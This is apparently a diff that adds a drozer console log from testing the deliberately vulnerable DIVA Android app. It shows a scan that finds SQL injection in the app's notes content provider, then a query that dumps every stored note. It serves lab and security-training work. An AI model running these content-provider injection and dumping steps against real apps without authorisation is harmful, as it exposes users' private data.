@@ -1,0 +1,42 @@
+root@ubuntu-server:~# 
+Selecting 86a5cfb714c63aba (unknown SSL PINNING TWITTER 7.0)
+
+            ..                    ..:.
+           ..o..                  .r..
+            ..a..  . ....... .  ..nd
+              ro..idsnemesisand..pr
+              .otectorandroidsneme.
+           .,sisandprotectorandroids+.
+         ..nemesisandprotectorandroidsn:.
+        .emesisandprotectorandroidsnemes..
+      ..isandp,..,rotectorandro,..,idsnem.
+      .isisandp..rotectorandroid..snemisis.
+      ,andprotectorandroidsnemisisandprotec.
+     .torandroidsnemesisandprotectorandroid.
+     .snemisisandprotectorandroidsnemesisan:
+     .dprotectorandroidsnemesisandprotector.
+
+drozer Console (v2.4.4)
+dz> run scanner.provider.injection -a jakhar.aseem.diva
+Scanning jakhar.aseem.diva...
+Not Vulnerable:
+  content://jakhar.aseem.diva.provider.notesprovider
+  content://jakhar.aseem.diva.provider.notesprovider/
+
+Injection in Projection:
+  content://jakhar.aseem.diva.provider.notesprovider/notes/
+  content://jakhar.aseem.diva.provider.notesprovider/notes
+
+Injection in Selection:
+  content://jakhar.aseem.diva.provider.notesprovider/notes/
+  content://jakhar.aseem.diva.provider.notesprovider/notes
+dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/ --projection "*"
+| _id | title    | note                                 |
+| 5   | Exercise | Alternate days running               |
+| 4   | Expense  | Spent too much on home theater       |
+| 6   | Weekend  | b333333333333r                       |
+| 3   | holiday  | Either Goa or Amsterdam              |
+| 2   | home     | Buy toys for baby, Order dinner      |
+| 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
+
+dz>
